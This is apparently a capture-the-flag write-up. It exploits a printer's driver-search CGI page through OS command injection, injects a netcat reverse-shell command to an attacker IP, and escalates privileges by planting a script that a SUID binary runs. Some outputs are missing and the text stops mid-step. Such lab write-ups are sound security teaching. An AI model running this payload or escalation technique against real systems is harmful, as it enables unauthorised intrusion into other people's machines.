> I found this printer on the network, and it seems to be running... a weird web page... to search for drivers?

Submitting the form would send a HTTP GET request to `cgi-bin/search.cgi?q=` with parameter `q`. I decided to do some common injections on the input field, and found that it was vulnerable to os command injection.

I then decided to get an interactive reverse shell, by firstly listening on port `4444`, and then sending a reverse the command `;nc 10.200.3.4 4444 -e %2Fbin%2Fbash`, and I was in:

As per the challenge description, the flag is in `/root/flag.txt`, So I knew the next phase of the challenge was doing privilege escalation, so I ran the command `find / -type f -perms 4000` to look for a file thats suid vulnerable.

I found a file that could be exploited: `/usr/local/bin/admin_help`, I ran `cat /usr/local/bin/admin_help` and realised it was a binary file, but it had useful strings like `/tmp/wish.sh`.

Running the `/usr/local/bin/admin_help` gave the following output:

I then decided to create the `/tmp/wish.sh` file and add a command in it to print the content of the `/root/flag.txt`:
